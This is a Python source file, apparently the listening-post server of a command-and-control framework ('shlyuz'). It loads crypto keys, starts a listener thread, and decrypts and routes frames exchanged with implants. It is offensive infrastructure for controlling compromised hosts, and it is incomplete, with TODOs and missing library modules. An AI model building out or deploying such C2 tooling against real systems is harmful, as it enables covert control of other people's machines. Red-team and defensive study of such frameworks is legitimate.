#!/usr/bin/env python3

import asyncio
import ast
import argparse
from threading import Thread

from lib import logging
from lib import listening_post
from lib import configparse
from lib import common
from lib import transmit
from lib import frame_orchestrator
from lib import implants
from lib.crypto import asymmetric


class Listener(object):
    def __init__(self, args):
        """
        Initialized LP

        :param args: arguments received via main argument parser
        """

        super(Listener, self).__init__()

        # Runtime Variables
        self.logging = logging.Logging(args['debug'])
        self.logging.log("Starting LP", source="lp_init")
        self.version = common.VERSION
        self.addr = args['address']
        self.port = args['port']
        self.config = configparse.ConfigParse(args['config'])
        self.component_id = self.config.config['lp']['component_id']

        # Crypto values
        self.initial_private_key = asymmetric.private_key_from_bytes(self.config.config['crypto']['private_key'])
        self.initial_public_key = self.initial_private_key.public_key
        self.initial_ts_pubkey = asymmetric.public_key_from_bytes(self.config.config['crypto']['ts_pk'])
        self.current_private_key = self.initial_private_key
        self.current_public_key = self.initial_public_key
        self.current_ts_pubkey = self.initial_ts_pubkey
        self.xor_key = ast.literal_eval(self.config.config['crypto']['xor_key'])

        # Implant Runtime Vars
        self.implants = []
        self.implant_count = len(self.implants)
        self.cmd_queue = []

        # Transport Runtime Vars
        # Used for implant manifest retrievals
        self.transports = []
        self.transport_frame_queue = []
        # self.transport_count = len(self.transports)

    def start(self):
        """
        Listening Post Startup and runner

        :return:
        """

        # Give ourselves a listening_post
        self.listening_post = listening_post.Listener(self)

        lp_thread = Thread(target=self.listening_post.start_lp, args=(self,))
        lp_thread.start()
        self.logging.log("Started LP")
        # TODO: Async or thread this
        # TODO: Loop to handle implant comms

    async def process_transport_frame(self):
        transport_frame = self.transport_frame_queue[-1]
        self.transport_frame_queue.pop(-1)
        cooked_frame = transport_frame['frame']
        if transport_frame['type'] == "init":
            # TODO: Check if implant is already in self.implants
            # if implants._get_implant_index(uncooked_frame['args'][0]['manifest']['implant_id']) is None:
                # uncooked_frame = ast.literal_eval(transmit.uncook_sealed_frame(self, cooked_frame).decode('utf-8'))
            # else:
            #     uncooked_frame =
            uncooked_frame = ast.literal_eval(transmit.uncook_sealed_frame(self, cooked_frame).decode('utf-8'))
        else:
            try:
                uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(self, cooked_frame).decode('utf-8'))
            except Exception as e:
                self.logging.log("Invalid transport frame received", level="error")
                uncooked_frame = None
        if uncooked_frame is not None:
            uncooked_reply_frame = frame_orchestrator.determine_destination(uncooked_frame, self)
            reply_frame = transmit.cook_transmit_frame(self, uncooked_reply_frame, uncooked_frame['args'][0]['manifest']['implant_id'])
            return reply_frame


if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='lp')
    parser.add_argument("-a", "--address", required=False, default="127.0.0.1", help="Address to connect to")
    parser.add_argument("-p", "--port", required=False, default=8081, help="Port to connect to")
    parser.add_argument("-d", "--debug", required=False, default=False, action="store_true",
                        help="Enable debug logging")
    parser.add_argument("-c", "--config", required=False, default="config/shlyuz.conf",
                        help="Path to configuration file")

    # parse the args
    args = vars(parser.parse_args())

    lp = Listener(args)
    lp.start()
